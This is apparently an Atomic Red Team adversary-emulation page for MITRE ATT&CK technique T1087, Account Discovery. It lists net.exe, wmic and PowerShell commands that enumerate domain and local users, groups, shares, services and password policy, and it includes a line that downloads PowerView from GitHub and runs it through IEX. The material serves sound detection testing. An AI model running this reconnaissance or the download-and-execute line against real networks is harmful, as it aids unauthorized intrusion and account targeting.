﻿## Account Discovery

MITRE ATT&CK Technique: [T1087](https://attack.mitre.org/wiki/Technique/T1087)

## Test Script

[Discovery](https://github.com/redcanaryco/atomic-red-team/tree/master/Windows/Payloads/Discovery.bat)

### Net.exe

Domain Group Enumeration:

    net group "domain admins" /domain

Domain User Enumeration:

    net user <username> /domain

Local Group Enumeration:

    net localgroup "administrators"

Local User Enumeration:

    net user

Input:

    net use

Input:

    net share

Input:

    net view

Input:

    net accounts

## wmic.exe

### Reconnaissance

Input:

    wmic useraccount get /ALL

Input:

    wmic useraccount list

Input:

    wmic startup list brief

Input:

    wmic share list

Input:

    wmic service get name,displayname,pathname,startmode

Input:

    wmic process list brief

Input:

    wmic process get caption,executablepath,commandline

Input:

    wmic qfe get description,installedOn /format:csv

Input:

    wmic /node:"192.168.0.1" service where (caption like "%sql server (%")

Input:

    get-wmiobject –class "win32_share" –namespace "root\CIMV2" –computer "targetname"
    
### PowerShell

(https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

Input:

    PS> Import-Module PowerView.ps1
        #Or load directly from the raw github content:
    PS> (New-Object System.Net.Webclient).downloadstring(“https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1”) | IEX

    PS> Get-NetGroup *Admins*
    PS> Get-NetGroup *Citrix*
    PS> Get-NetComputer *Win7* | Select samaccountname
    PS> Get-NetUser *Admins*
    PS> Get-NetUser | Where {$_.samaccountname –eq “<username>”}
    PS> Get-NetUser -filter samaccountname=<username>
    
Input:

    #Most commonly found on Domain Controllers or where the ad tools 
    PS> Import-Module ActiveDirectory 

    #Find users who’s password never expires – export to csv 
    PS> Get-ADuser -filter * -properties passwordlastset, enabled, passwordneverexpires, Samaccountname | where-object {$_.passwordneverexpires - eq $true -and $_.enabled -eq $true} | Export-csv -path passwords.csv 

    #Find only enabled accounts – export to csv 
    PS> get-aduser -filter * -properties enabled, Samaccountname |where-object {$_.enabled -eq $true} | Export-csv -path enabled-accounts.csv

    #Obtain the default password policy 
    PS> get-addefaultdomainpasswordpolicy 
    PS> get-addomaincontroller
